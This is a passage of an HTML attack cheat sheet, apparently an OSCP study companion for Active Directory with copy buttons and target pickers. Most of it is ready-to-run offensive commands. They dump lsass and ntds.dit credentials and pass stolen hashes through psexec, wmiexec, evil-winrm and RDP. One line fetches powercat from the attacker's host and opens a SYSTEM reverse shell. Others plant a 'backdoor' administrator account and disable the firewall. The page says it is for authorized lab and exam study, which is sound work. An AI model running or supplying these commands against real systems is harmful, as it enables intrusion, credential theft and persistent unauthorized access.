+      <p class="hint">No shell yet? lsassy pulls lsass remotely anyway</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' -M lsassy</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Get a SYSTEM shell</h3>
+      <p class="hint">Catch a SYSTEM shell...</p><div class="cmd sh-kali"><div class="row"><pre><code>rlwrap nc -lvnp <span class="var" data-var="LHOSTPORT">$LHOSTPORT</span></code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...trigger: push a reverse shell back as SYSTEM</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' --local-auth --exec-method smbexec -X "irm http://<span class="var" data-var="KALI">$KALI</span>/powercat.ps1 | iex ; powercat -c <span class="var" data-var="KALI">$KALI</span> -p <span class="var" data-var="LHOSTPORT">$LHOSTPORT</span> -e cmd.exe"</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Crack files you already have</h3>
+      <p class="hint">Windows.old left over from an upgrade — check every box, DC or not</p><div class="cmd sh-ps"><div class="row"><pre><code>Get-ChildItem C:\Windows.old\Windows\NTDS\, C:\Windows.old\Windows\System32\config\ -ErrorAction SilentlyContinue</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">No admin shortcut? Manual VSS: create the shadow copy</p><div class="cmd sh-cmd"><div class="row"><pre><code>vssadmin create shadow /for=C:</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...copy ntds.dit out of it</p><div class="cmd sh-cmd"><div class="row"><pre><code>copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\ntds.dit" C:\Windows\Temp\ntds.dit.save</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...SYSTEM hive isn't locked, saves directly</p><div class="cmd sh-cmd"><div class="row"><pre><code>reg save HKLM\SYSTEM C:\Windows\Temp\system.save</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...clean up the shadow when done</p><div class="cmd sh-cmd"><div class="row"><pre><code>vssadmin delete shadows /shadow={GUID}</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Or ntdsutil — does the whole export in one command</p><div class="cmd sh-cmd"><div class="row"><pre><code>ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Offline crack — ntds.dit + SYSTEM</p><div class="cmd sh-kali"><div class="row"><pre><code>impacket-secretsdump -ntds ntds.dit -system system.save LOCAL</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...SAM + SYSTEM alone, no SECURITY</p><div class="cmd sh-kali"><div class="row"><pre><code>impacket-secretsdump -sam SAM -system system.save LOCAL</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...SECURITY + SYSTEM alone, no SAM</p><div class="cmd sh-kali"><div class="row"><pre><code>impacket-secretsdump -security SECURITY -system system.save LOCAL</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...all three together, one pass</p><div class="cmd sh-kali"><div class="row"><pre><code>impacket-secretsdump -sam SAM -security SECURITY -system system.save LOCAL</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Found lsass.dmp instead? Parse it offline, no Windows needed</p><div class="cmd sh-kali"><div class="row"><pre><code>pypykatz lsa minidump lsass.dmp</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Grab your proof</h3>
+      <p class="hint">Flag + box info before you move on — cmd.exe / PowerShell, proof.txt / local.txt</p><div class="cmd sh-cmd"><div class="row"><pre><code>hostname &amp;&amp; whoami /all &amp;&amp; type proof.txt &amp;&amp; ipconfig</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-ps"><div class="row"><pre><code>hostname; whoami /all; type proof.txt; ipconfig</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-cmd"><div class="row"><pre><code>hostname &amp;&amp; whoami /all &amp;&amp; type local.txt &amp;&amp; ipconfig</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-ps"><div class="row"><pre><code>hostname; whoami /all; type local.txt; ipconfig</code></pre><button class="copy">COPY</button></div></div>
+    </div>
+  </section>
+
+  <section id="s-access" class="blk">
+    <h2>Pick your access method</h2>
+    <div class="blk-body">
+      <h3 class="subhead-lite">By port</h3>
+      <p class="hint">Check what's actually open first</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nmap -p22,445,3389,5985,5986 <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span></code></pre><button class="copy">COPY</button></div></div>
+      <div class="cmdname"><p class="hint">SSH</p><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>ssh '<span class="var" data-var="USER">$USER</span>'@<span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span></code></pre><button class="copy">COPY</button></div></div>
+      <div class="cmdname"><p class="hint">WinRM</p><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>evil-winrm -i <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>'</code></pre><button class="copy">COPY</button></div></div>
+      <div class="cmdname"><p class="hint">RDP</p><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>xfreerdp /v:<span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> /u:'<span class="var" data-var="USER">$USER</span>' /p:'<span class="var" data-var="PASS">$PASS</span>' /dynamic-resolution</code></pre><button class="copy">COPY</button></div></div>
+      <div class="cmdname"><p class="hint">One-off command via SMB, no interactive shell</p><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> -u '<span class="var" data-var="USER">$USER</span>' -p '<span class="var" data-var="PASS">$PASS</span>' --exec-method smbexec -X "whoami"</code></pre><button class="copy">COPY</button></div></div>
+      <div class="cmdname"><p class="hint">wmiexec</p><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-wmiexec <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span>@<span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span></code></pre><button class="copy">COPY</button></div></div>
+      <div class="cmdname"><p class="hint">psexec</p><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-psexec <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>:<span class="var" data-var="PASS">$PASS</span>@<span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span></code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Got a hash instead</h3>
+      <p class="hint">Same list, hash instead of password — SMB one-off, local-account version:</p><div class="cmdname"><p class="hint">Domain account</p><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> -u '<span class="var" data-var="USER">$USER</span>' -H '<span class="var" data-var="HASH">$HASH</span>' -d <span class="var" data-var="DOMAIN">$DOMAIN</span> --exec-method smbexec -X "whoami"</code></pre><button class="copy">COPY</button></div></div><div class="cmdname"><p class="hint">Local account</p><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>nxc smb <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> -u '<span class="var" data-var="USER">$USER</span>' -H '<span class="var" data-var="HASH">$HASH</span>' --local-auth --exec-method smbexec -X "whoami"</code></pre><button class="copy">COPY</button></div></div>
+      <div class="cmdname"><p class="hint">WinRM with a hash</p><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>evil-winrm -i <span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> -u '<span class="var" data-var="USER">$USER</span>' -H '<span class="var" data-var="HASH">$HASH</span>'</code></pre><button class="copy">COPY</button></div></div>
+      <div class="cmdname"><p class="hint">wmiexec with a hash — colon for the blank LM half is baked in, just drop in the NT hash:</p><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-wmiexec -hashes :<span class="var" data-var="HASH">$HASH</span> <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>@<span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span></code></pre><button class="copy">COPY</button></div></div>
+      <div class="cmdname"><p class="hint">psexec with a hash</p><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>impacket-psexec -hashes :<span class="var" data-var="HASH">$HASH</span> <span class="var" data-var="DOMAIN">$DOMAIN</span>/<span class="var" data-var="USER">$USER</span>@<span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span></code></pre><button class="copy">COPY</button></div></div>
+      <div class="cmdname"><p class="hint">RDP pass-the-hash — needs Restricted Admin Mode already on at the target</p><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1">T1</option><option value="T2" selected>T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T2</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T1">T1</div><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T2" aria-selected="true">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>xfreerdp /v:<span class="var m-t2" data-var="T2" data-tgt-slot>$T2</span> /u:'<span class="var" data-var="USER">$USER</span>' /pth:<span class="var" data-var="HASH">$HASH</span> /dynamic-resolution</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">...turn that mode on yourself first, if you've already got a shell</p><div class="cmd sh-cmd"><div class="row"><pre><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f</code></pre><button class="copy">COPY</button></div></div>
+    </div>
+  </section>
+
+  <section id="s-postadmin" class="blk">
+    <h2>Post-admin — persistence, RDP &amp; domain users</h2>
+    <div class="blk-body">
+      <h3 class="subhead-lite">Backdoor admin + RDP (once you're admin/SYSTEM)</h3>
+      <p class="hint">Add a local user, then drop it into the Administrators group</p><div class="cmd sh-cmd"><div class="row"><pre><code>net user backdoor Password1 /add</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-cmd"><div class="row"><pre><code>net localgroup administrators backdoor /add</code></pre><button class="copy">COPY</button></div></div>
+      <p class="hint">Turn RDP on (fDenyTSConnections 0 = allow) and drop the firewall so that account can log in</p><div class="cmd sh-cmd"><div class="row"><pre><code>reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><button class="copy">COPY</button></div></div><div class="cmd sh-cmd"><div class="row"><pre><code>netsh advfirewall set allprofiles state off</code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">Check RDP is reachable</h3>
+      <p class="hint">From Kali — add -u/-p to log straight in</p><div class="cmdname" style="justify-content:flex-end"><div class="tgt-pick-wrap"><select class="tgt-pick" title="Which box is this targeting?"><option value="T1" selected>T1</option><option value="T2">T2</option><option value="DC">DC</option></select><button type="button" class="tgt-pick-btn" aria-haspopup="listbox" aria-expanded="false"><span class="tgt-pick-btn-label">T1</span></button><div class="tgt-pick-menu" role="listbox" aria-hidden="true"><div class="tgt-pick-opt sel" role="option" tabindex="0" data-value="T1" aria-selected="true">T1</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="T2">T2</div><div class="tgt-pick-opt" role="option" tabindex="0" data-value="DC">DC</div></div></div></div><div class="cmd sh-kali"><div class="row"><pre><code>rdesktop <span class="var m-t1" data-var="T1" data-tgt-slot>$T1</span></code></pre><button class="copy">COPY</button></div></div>
+      <h3 class="subhead-lite">List domain users</h3>
+      <p class="hint">From a shell on a domain-joined box — queries the DC for every domain account</p><div class="cmd sh-cmd"><div class="row"><pre><code>net user /domain</code></pre><button class="copy">COPY</button></div></div>
+    </div>
+  </section>
+
+  <!-- sinogear :: footer / end of guide -->
+<footer>Companion file — the full Credentialed AD Playbook has the explanations, worked examples and troubleshooting notes behind every one of these. This page is a separate artifact: its config panel is <b>not</b> shared with that one, fill in both once. Fill-ins stick between visits · salmon = still a placeholder · green = filled · bright red = DC-colored var · kdestroy after every clock fix.</footer>
+
+  <!-- sinogear -->
+  <div class="sig" style="text-align:center;margin:30px auto 16px;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:13px;letter-spacing:.14em;text-transform:uppercase;color:#7f8a9b">&mdash;&mdash;&nbsp; curated &amp; shared by <span style="color:#6ea8f7;font-weight:700;letter-spacing:.18em">sinogear</span> &nbsp;&mdash;&mdash;</div>
+  <!-- sinogear :: tagline -->
+  <div class="tagline" style="text-align:center;margin:0 auto 28px;max-width:760px;padding:0 16px;font-size:12px;color:#9aa3b2;letter-spacing:.03em;line-height:1.5">OSCP / PEN-200 study notes &middot; BloodHound ACL abuse, all object types &middot; dark build &middot; for authorized lab &amp; exam use only.</div>
+
+</div>
+
+<!-- sinogear :: logic (config panel + copy + target pickers) -->
+<script>
+  var VARS = ["KALI", "DC", "T1", "T1INT", "T2", "DOMAIN", "SUBNET", "USER", "PASS", "HASH", "LHOSTPORT", "LIGPORT", "DCNAME", "T1NAME", "T2NAME"];
+  var KEY = 'ad-playbook-config';
+
+  function applyVar(name){
+    var input = document.getElementById('cfg-'+name);
+    var val = input.value.trim();
+    var display = val.length ? val : ('$'+name);
+    document.querySelectorAll('.var[data-var="'+name+'"]').forEach(function(span){
+      span.textContent = display;
+      span.classList.toggle('filled', val.length > 0);
+    });
+    if (name === 'DOMAIN') {
+      var basedn = val.length ? val.split('.').map(function(p){ return 'dc='+p; }).join(',') : '$BASEDN';
+      document.querySelectorAll('.var[data-var="BASEDN"]').forEach(function(span){
+        span.textContent = basedn;
+        span.classList.toggle('filled', val.length > 0);
+      });
+    }
+    refreshTgtPickLabels();
+  }
+
+  function applyAll(){ VARS.forEach(applyVar); }
+
+  // ---- per-command target picker (evil-winrm / xfreerdp / wmiexec / psexec / nxc exec / ssh) ----
+  var TGT_VARS = ['T1','T2','DC'];
+  var TGT_LABEL = {T1:'T1NAME', T2:'T2NAME', DC:'DCNAME'};
+  var TGT_MARKER = {T1:'m-t1', T2:'m-t2', DC:'m-dc'};
+  var TGT_KEY = 'ad-playbook-targets-qr-v2';
+
+  function tgtLabel(v){
+    var nameInput = document.getElementById('cfg-'+TGT_LABEL[v]);
+    var name = nameInput ? nameInput.value.trim() : '';
+    return v + (name ? ' — ' + name : '');
+  }
+
+  function refreshTgtPickLabels(){
+    document.querySelectorAll('select.tgt-pick').forEach(function(sel){
+      Array.prototype.forEach.call(sel.options, function(opt){ opt.textContent = tgtLabel(opt.value); });
+      var wrap = sel.closest('.tgt-pick-wrap');
+      if (wrap) syncTgtBtn(wrap);
+    });
+  }
+
+  function allTgtPicks(){ return Array.prototype.slice.call(document.querySelectorAll('select.tgt-pick')); }
+
+  function syncTgtBtn(wrap){
+    var sel = wrap.querySelector('select.tgt-pick');
+    var btn = wrap.querySelector('.tgt-pick-btn');
+    var menu = wrap.querySelector('.tgt-pick-menu');
+    if (!sel || !btn || !menu) return;
+    var opt = sel.options[sel.selectedIndex];
+    btn.querySelector('.tgt-pick-btn-label').textContent = opt ? opt.textContent : sel.value;
+    menu.querySelectorAll('.tgt-pick-opt').forEach(function(o){
+      var isSel = o.getAttribute('data-value') === sel.value;
+      o.classList.toggle('sel', isSel);
+      o.setAttribute('aria-selected', isSel ? 'true' : 'false');
+      var srcOpt = sel.querySelector('option[value="'+o.getAttribute('data-value')+'"]');
+      if (srcOpt) o.textContent = srcOpt.textContent;
+    });
+  }
+
+  function closeAllTgtMenus(){
+    document.querySelectorAll('.tgt-pick-menu.open').forEach(function(m){ m.classList.remove('open'); m.setAttribute('aria-hidden','true'); });
+    document.querySelectorAll('.tgt-pick-btn[aria-expanded="true"]').forEach(function(b){ b.setAttribute('aria-expanded','false'); });
+  }
+
+  function positionTgtMenu(wrap, menu){
+    menu.style.left = ''; menu.style.right = '0';
+    var wrapRect = wrap.getBoundingClientRect();
+    var margin = 8;
+    var menuW = menu.offsetWidth;
+    var desired = wrapRect.right - menuW;
+    var maxLeft = window.innerWidth - margin - menuW;
+    if (desired < margin) desired = margin;
+    if (desired > maxLeft) desired = Math.max(margin, maxLeft);
+    menu.style.left = (desired - wrapRect.left) + 'px';
+    menu.style.right = 'auto';
+  }
+
+  function initTgtMenus(){
+    document.querySelectorAll('.tgt-pick-wrap').forEach(function(wrap){
+      var sel = wrap.querySelector('select.tgt-pick');
+      var btn = wrap.querySelector('.tgt-pick-btn');
+      var menu = wrap.querySelector('.tgt-pick-menu');
+      if (!sel || !btn || !menu) return;
+
+      btn.addEventListener('click', function(e){
+        e.stopPropagation();
+        var isOpen = menu.classList.contains('open');
+        closeAllTgtMenus();
+        if (!isOpen){
+          positionTgtMenu(wrap, menu);
+          menu.classList.add('open');
+          menu.setAttribute('aria-hidden','false');
+          btn.setAttribute('aria-expanded','true');
+        }
+      });
+
+      menu.querySelectorAll('.tgt-pick-opt').forEach(function(o){
+        function choose(){
+          sel.value = o.getAttribute('data-value');
+          sel.dispatchEvent(new Event('change'));
+          closeAllTgtMenus();
+          btn.focus();
+        }
+        o.addEventListener('click', choose);
+        o.addEventListener('keydown', function(e){
+          if (e.key === 'Enter' || e.key === ' '){ e.preventDefault(); choose(); }
+        });
+      });
+
+      syncTgtBtn(wrap);
+    });
+
+    document.addEventListener('click', closeAllTgtMenus);
+    document.addEventListener('keydown', function(e){ if (e.key === 'Escape') closeAllTgtMenus(); });
+  }
+
+  function applyTgtPick(sel){
+    var span = sel.closest('.cmdname').nextElementSibling.querySelector('.var[data-tgt-slot]');
+    if (!span) return;
+    var newVar = sel.value;
+    span.setAttribute('data-var', newVar);
+    TGT_VARS.forEach(function(v){ span.classList.remove(TGT_MARKER[v]); });
+    span.classList.add(TGT_MARKER[newVar]);
+    applyVar(newVar);
+  }
+
+  function saveTgtPicks(){
+    var vals = allTgtPicks().map(function(s){ return s.value; });
+    try { localStorage.setItem(TGT_KEY, JSON.stringify(vals)); } catch(e){}
+  }
+
+  function loadTgtPicks(){
+    var vals = [];
+    try { vals = JSON.parse(localStorage.getItem(TGT_KEY) || '[]'); } catch(e){}
+    allTgtPicks().forEach(function(sel, i){
+      if (vals[i] && sel.querySelector('option[value="'+vals[i]+'"]')) sel.value = vals[i];
+      applyTgtPick(sel);
+    });
+    refreshTgtPickLabels();
+  }
+
+  function initTgtPicks(){
+    allTgtPicks().forEach(function(sel){
+      sel.addEventListener('change', function(){ applyTgtPick(sel); saveTgtPicks(); });
+    });
+    loadTgtPicks();
+  }
+
+  function save(){
+    var obj = {};
+    VARS.forEach(function(name){ obj[name] = document.getElementById('cfg-'+name).value; });
+    try { localStorage.setItem(KEY, JSON.stringify(obj)); } catch(e){}
+  }
+
+  function load(){
+    var saved = {};
+    try { saved = JSON.parse(localStorage.getItem(KEY) || '{}'); } catch(e){}
+    VARS.forEach(function(name){
+      if (saved[name]) document.getElementById('cfg-'+name).value = saved[name];
+    });
+    applyAll();
+  }
+
+  VARS.forEach(function(name){
+    var input = document.getElementById('cfg-'+name);
+    input.addEventListener('input', function(){ applyVar(name); save(); });
+  });
+
+  load();
+  initTgtPicks();
+  initTgtMenus();
+
+  (function(){
+    var cfgPanel = document.querySelector('.cfg');
+    var fab = document.getElementById('fabCfg');
+    if (!cfgPanel || !fab) return;
+    if ('IntersectionObserver' in window) {
+      var obs = new IntersectionObserver(function(entries){
+        entries.forEach(function(e){ fab.classList.toggle('show', !e.isIntersecting); });
+      }, {threshold: 0});
+      obs.observe(cfgPanel);
+    }
+    fab.addEventListener('click', function(){
+      cfgPanel.scrollIntoView({behavior:'smooth', block:'start'});
+    });
+  })();
+
+  document.querySelectorAll('.copy').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      var code = btn.closest('.cmd').querySelector('code');
+      var text = code.textContent.trim();
+      var done = function(){ btn.textContent = 'COPIED'; btn.classList.add('done'); setTimeout(function(){ btn.textContent = 'COPY'; btn.classList.remove('done'); }, 1300); };
+      var fallback = function(){ sel(code); var ok=false; try{ ok=document.execCommand('copy'); }catch(e){} if(ok){ done(); } };
+      if (navigator.clipboard && navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(fallback);
+      } else { fallback(); }
+    });
+  });
+  function sel(code){ var r=document.createRange(); r.selectNodeContents(code); var s=window.getSelection(); s.removeAllRanges(); s.addRange(r); }
+
+  // run-through checklist: ticks persist locally, independent of the var-config above
+  (function(){
+    var CHK_KEY = 'ad-commands-checklist';
+    var boxes = document.querySelectorAll('.chk-row input[type="checkbox"]');
+    function updateChkProgress(){
+      var done = 0;
+      boxes.forEach(function(b){ if (b.checked) done++; });
+      var el = document.getElementById('chkProgress');
+      if (el) el.textContent = done + '/' + boxes.length;
+    }
+    function saveChk(){
+      var state = {};
+      boxes.forEach(function(b){ state[b.getAttribute('data-chk')] = b.checked; });
+      try { localStorage.setItem(CHK_KEY, JSON.stringify(state)); } catch(e){}
+    }
+    function loadChk(){
+      var saved = {};
+      try { saved = JSON.parse(localStorage.getItem(CHK_KEY) || '{}'); } catch(e){}
+      boxes.forEach(function(b){
+        if (saved[b.getAttribute('data-chk')]) b.checked = true;
+      });
+      updateChkProgress();
+    }
